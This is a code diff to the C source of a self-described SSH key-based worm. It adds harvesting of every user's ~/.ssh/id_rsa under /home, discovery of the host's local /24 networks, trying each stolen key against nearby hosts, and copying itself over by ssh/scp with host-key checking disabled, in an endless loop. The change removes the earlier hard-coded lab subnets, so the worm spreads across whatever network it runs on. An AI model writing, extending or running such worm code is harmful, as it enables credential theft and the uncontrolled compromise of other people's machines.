@@ -14,6 +14,8 @@
 #include <sys/stat.h>
 #include <limits.h>
 #include <stdint.h>
+#include <dirent.h>
+#include <ifaddrs.h>
 
 // Configuration
 #define MAX_SUBNETS 4
@@ -22,17 +24,18 @@
 #define CHUNK_SIZE 4000
 #define REMOTE_WORM_PATH "/tmp/worm"
 #define REMOTE_B64_PATH "/tmp/worm.b64"
-#define SSH_KEY_PATH "/root/.ssh/id_rsa"
 #define SCAN_TIMEOUT 2
 #define SSH_TIMEOUT 10
 
-// Subnets to scan
-const char* SUBNETS[MAX_SUBNETS] = {
-    "172.28.1",
-    "172.28.2",
-    "172.28.3",
-    "172.28.4"
-};
+char* SSH_KEY_PATH = NULL;
+char* SSH_USER = NULL;
+char* SSH_KEY_LIST[100];
+char* SSH_USER_LIST[100];
+int SSH_KEY_COUNT = 0;
+char* local_ips[10];
+int local_ip_count = 0;
+char* unique_networks[10];
+int unique_network_count = 0;
 
 // Base64 encoding table
 static const char base64_table[] = 
@@ -148,9 +151,29 @@ unsigned char* polimorfism(unsigned char* file_content, size_t total_read, size_
 }
 
 /**
- * Get the path to the current executable
- * Returns dynamically allocated string (caller must free)
+ * Get all local IP addresses of the host (excluding loopback)
  */
+void get_local_ips() {
+    struct ifaddrs *ifaddr, *ifa;
+    if (getifaddrs(&ifaddr) == -1) {
+        return;
+    }
+    
+    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
+        if (ifa->ifa_addr == NULL) continue;
+        if (ifa->ifa_addr->sa_family == AF_INET) {
+            struct sockaddr_in *addr = (struct sockaddr_in *)ifa->ifa_addr;
+            char *ip = inet_ntoa(addr->sin_addr);
+            // Skip localhost
+            if (strcmp(ip, "127.0.0.1") != 0 && local_ip_count < 10) {
+                local_ips[local_ip_count] = strdup(ip);
+                local_ip_count++;
+            }
+        }
+    }
+    
+    freeifaddrs(ifaddr);
+}
 char* get_executable_path(const char* argv0) {
     char* path = malloc(PATH_MAX);
     if (!path) return NULL;
@@ -176,40 +199,59 @@ char* get_executable_path(const char* argv0) {
     return NULL;
 }
 
+
+
+
+
+
 /**
- * Read SSH private key from /root/.ssh/id_rsa
- * Returns dynamically allocated key content (caller must free), or NULL on error
+ * Read SSH private keys from user home directories .ssh/id_rsa
+ * Stores found keys in global lists for later testing
+ * Returns the number of keys found
  */
-char* read_ssh_key() {
-    FILE* f = fopen(SSH_KEY_PATH, "r");
-    if (!f) {
-        printf("[-] SSH key not found at %s\n", SSH_KEY_PATH);
-        return NULL;
+int read_ssh_key() {
+    DIR* home_dir = opendir("/home");
+    if (!home_dir) return 0;
+    
+    struct dirent* entry;
+    while ((entry = readdir(home_dir)) != NULL) {
+        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
+        
+        char user_path[MAX_PATH_LEN];
+        snprintf(user_path, sizeof(user_path), "/home/%s", entry->d_name);
+        
+        struct stat st;
+        if (stat(user_path, &st) == 0 && S_ISDIR(st.st_mode)) {
+            char key_path[MAX_PATH_LEN];
+            snprintf(key_path, sizeof(key_path), "%s/.ssh/id_rsa", user_path);
+            
+            if (access(key_path, R_OK) == 0) {
+                SSH_KEY_LIST[SSH_KEY_COUNT] = strdup(key_path);
+                
+                char user[256];
+                if (sscanf(key_path, "/home/%255[^/]/", user) == 1) {
+                    SSH_USER_LIST[SSH_KEY_COUNT] = strdup(user);
+                } else {
+                    SSH_USER_LIST[SSH_KEY_COUNT] = strdup("root");
+                }
+                
+                SSH_KEY_COUNT++;
+                if (SSH_KEY_COUNT >= 100) break;
+            }
+        }
     }
-    
-    // Get file size
-    fseek(f, 0, SEEK_END);
-    long key_size = ftell(f);
-    fseek(f, 0, SEEK_SET);
-    
-    if (key_size <= 0) {
-        fclose(f);
-        return NULL;
-    }
-    
-    char* key_content = malloc(key_size + 1);
-    if (!key_content) {
-        fclose(f);
-        return NULL;
-    }
-    
-    size_t bytes_read = fread(key_content, 1, key_size, f);
-    fclose(f);
-    key_content[bytes_read] = '\0';
-    
-    printf("[+] SSH key loaded from %s (%zu bytes)\n", SSH_KEY_PATH, bytes_read);
-    return key_content;
+    closedir(home_dir);
+    return SSH_KEY_COUNT;
 }
+
+
+
+
+
+
+
+
+
 
 /**
  * Scan target IP for port 22 (SSH)
@@ -256,8 +298,8 @@ int run_ssh_command(const char* ip, const char* command) {
     char ssh_cmd[4096];
     snprintf(ssh_cmd, sizeof(ssh_cmd),
         "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=%d "
-        "-i %s root@%s '%s' 2>/dev/null",
-        SSH_TIMEOUT, SSH_KEY_PATH, ip, command);
+        "-i %s %s@%s '%s' 2>/dev/null",
+        SSH_TIMEOUT, SSH_KEY_PATH, SSH_USER, ip, command);
     
     int result = system(ssh_cmd);
     return (result == 0) ? 1 : 0;
@@ -271,8 +313,8 @@ int scp_transfer(const char* ip, const char* local_file, const char* remote_file
     char scp_cmd[4096];
     snprintf(scp_cmd, sizeof(scp_cmd),
         "scp -o StrictHostKeyChecking=no -o ConnectTimeout=%d "
-        "-i %s %s root@%s:%s 2>/dev/null",
-        SSH_TIMEOUT, SSH_KEY_PATH, local_file, ip, remote_file);
+        "-i %s %s %s@%s:%s 2>/dev/null",
+        SSH_TIMEOUT, SSH_KEY_PATH, local_file, SSH_USER, ip, remote_file);
     
     int result = system(scp_cmd);
     return (result == 0) ? 1 : 0;
@@ -289,9 +331,27 @@ int infect_target(const char* ip, const char* argv0) {
     
     printf("[+] SSH Server found at %s!\n", ip);
     
-    // Check if SSH key exists
-    if (access(SSH_KEY_PATH, R_OK) != 0) {
-        printf("[-] SSH key not accessible at %s\n", SSH_KEY_PATH);
+    // Find a working SSH key for this IP
+    int found_key = 0;
+    for (int i = 0; i < SSH_KEY_COUNT; i++) {
+        char ssh_cmd[4096];
+        snprintf(ssh_cmd, sizeof(ssh_cmd),
+            "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=%d "
+            "-i %s %s@%s 'echo test' 2>/dev/null",
+            SSH_TIMEOUT, SSH_KEY_LIST[i], SSH_USER_LIST[i], ip);
+        
+        int result = system(ssh_cmd);
+        if (result == 0) {
+            SSH_KEY_PATH = SSH_KEY_LIST[i];
+            SSH_USER = SSH_USER_LIST[i];
+            printf("[+] Using SSH key for user %s on %s\n", SSH_USER, ip);
+            found_key = 1;
+            break;
+        }
+    }
+    
+    if (!found_key) {
+        printf("[-] No working SSH key found for %s\n", ip);
         return 0;
     }
     
@@ -382,8 +442,8 @@ int infect_target(const char* ip, const char* argv0) {
     char check_full_cmd[1024];
     snprintf(check_full_cmd, sizeof(check_full_cmd),
         "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=%d "
-        "-i %s root@%s '%s' > %s 2>/dev/null",
-        SSH_TIMEOUT, SSH_KEY_PATH, ip, check_cmd, result_file);
+        "-i %s %s@%s '%s' > %s 2>/dev/null",
+        SSH_TIMEOUT, SSH_KEY_PATH, SSH_USER, ip, check_cmd, result_file);
     
     system(check_full_cmd);
     
@@ -430,6 +490,15 @@ int infect_target(const char* ip, const char* argv0) {
     return 1;
 }
 
+void get_net_24(const char *ip, char *out) {
+    strcpy(out, ip);
+    char *last_dot = strrchr(out, '.');
+    if (last_dot) {
+        strcpy(last_dot, ".0/24");
+    }
+}
+
+
 int main(int argc, char* argv[]) {
     (void)argc;  // Suppress unused parameter warning
     printf("=== C SSH Key-Based Worm ===\n");
@@ -440,32 +509,72 @@ int main(int argc, char* argv[]) {
     // Delay to allow system to settle if just started
     sleep(2);
     
-    // Check if SSH key exists
-    char* ssh_key = read_ssh_key();
-    if (!ssh_key) {
-        printf("[-] No SSH key found. Waiting for key...\n");
-        // In a real scenario, we might try to steal keys or wait
-        // For now, we'll just continue and let individual infections fail
+    // Check if SSH keys exist
+    int keys_found = read_ssh_key();
+    if (keys_found == 0) {
+        printf("[-] No SSH keys found. Exiting...\n");
+        return 1;
     } else {
-        free(ssh_key);
+        printf("[+] Found %d SSH key(s)\n", keys_found);
     }
     
-    // Infection loop
+    // Get local IPs and determine networks to scan
+    get_local_ips();
+    if (local_ip_count == 0) {
+        printf("[-] Could not determine local IPs. Exiting...\n");
+        return 1;
+    }
+    
+    // Collect unique /24 networks
+    for (int i = 0; i < local_ip_count; i++) {
+        char network[INET_ADDRSTRLEN];
+        strcpy(network, local_ips[i]);
+        char *last_dot = strrchr(network, '.');
+        if (last_dot) {
+            strcpy(last_dot + 1, "0");
+        } else {
+            strcpy(network, "0.0.0.0");
+        }
+        
+        // Check if already in unique_networks
+        int found = 0;
+        for (int j = 0; j < unique_network_count; j++) {
+            if (strcmp(unique_networks[j], network) == 0) {
+                found = 1;
+                break;
+            }
+        }
+        
+        if (!found && unique_network_count < 10) {
+            unique_networks[unique_network_count] = strdup(network);
+            unique_network_count++;
+        }
+        
+        free(local_ips[i]);
+    }
+    
+    printf("[+] Found %d local IP(s), scanning %d unique network(s)\n", local_ip_count, unique_network_count);    // Infection loop
     while (1) {
         printf("\n[*] Starting infection round...\n");
         
-        for (int i = 0; i < MAX_SUBNETS; i++) {
-            // Try hosts .2 and .3
-            for (int host = 2; host < 4; host++) {
+        // Scan all unique networks
+        for (int net_idx = 0; net_idx < unique_network_count; net_idx++) {
+            char* network = unique_networks[net_idx];
+            char base_network[INET_ADDRSTRLEN];
+            strncpy(base_network, network, strlen(network) - 2);
+            base_network[strlen(network) - 2] = '\0';
+            printf("[+] Scanning network: %s/24\n", network);
+            
+            for (int host = 1; host <= 10; host++) {
                 char ip[MAX_IP_LEN];
-                snprintf(ip, sizeof(ip), "%s.%d", SUBNETS[i], host);
+                snprintf(ip, sizeof(ip), "%s.%d", base_network, host);
                 
                 infect_target(ip, argv[0]);
             }
         }
         
-        printf("[*] Round complete. Sleeping 20 seconds...\n");
-        sleep(20);
+        printf("[*] Round complete. Sleeping 10 seconds...\n");
+        sleep(10);
     }
     
     return 0;
